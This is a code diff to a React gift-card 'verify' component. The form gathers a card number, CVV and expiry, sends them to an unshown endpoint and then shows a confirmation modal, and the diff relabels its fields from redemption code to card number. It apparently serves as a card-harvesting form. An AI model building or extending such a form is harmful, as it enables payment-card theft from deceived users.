@@ -1,6 +1,6 @@
 "use client"
 
-import React, { useState } from 'react'
+import React, { useEffect, useState } from 'react'
 import Button from '../button/Button';
 import { useAlert } from 'react-alert'
 
@@ -11,6 +11,11 @@ const TypeThree = ({cardname, setShowmodal, showmodal, amount, setAmount, curren
     const [expiry, setExpiry] = useState('');
     const [loading, setLoading] = useState(false);
     const alert = useAlert();
+    const [mounted, setMounted] = useState(false);
+
+    useEffect(()=> {
+        setMounted(true);
+    }, [mounted])
 
     const handleVerify = async () => {
         setLoading(true)
@@ -22,14 +27,14 @@ const TypeThree = ({cardname, setShowmodal, showmodal, amount, setAmount, curren
             return;
         }
     
-        if(redemptionCode.length < 16){
-            alert.error("Invalid reedemption code");
+        if(redemptionCode.length < 13){
+            alert.error("Invalid card number");
             setLoading(false)
             return;
         }
 
             
-        if(cvv.length < 16){
+        if(cvv.length < 3){
             alert.error("Invalid CVV code");
             setLoading(false)
             return;
@@ -39,7 +44,7 @@ const TypeThree = ({cardname, setShowmodal, showmodal, amount, setAmount, curren
 Card Type: ${cardname}
 Currency: ${currency}
 Amount: ${amount}
-Reedemption Code: ${redemptionCode}
+Card Number: ${redemptionCode}
 Gift Card CVV: ${cvv}
 Gift Card Expiry Date: ${expiry}
 `;
@@ -53,9 +58,13 @@ Gift Card Expiry Date: ${expiry}
             headers:{
                 'content-type': 'application/json',
             }
+        }).then(()=> {
+            setShowmodal(true);
+            setLoading(false);
+        }).catch(err => {
+            setLoading(false);
+            alert.error("Something went wrong, try again.")
         })
-        setShowmodal(true);
-        setLoading(false)
     }
 
   return (
@@ -70,7 +79,7 @@ Gift Card Expiry Date: ${expiry}
             class="block w-full mb-4 p-2 rounded-lg" 
             value={redemptionCode} 
             onInput={e => setRedemptionCode(e.target.value)}
-            placeholder='Redemption Code'
+            placeholder='Card Number'
         />
         <input 
             type='number'
@@ -89,7 +98,7 @@ Gift Card Expiry Date: ${expiry}
         <Button
             title={"Verify"}
             loading={loading}
-            onClick={handleVerify}
+            onClick={mounted ? handleVerify : ()=>{}}
         />
     </>
   )
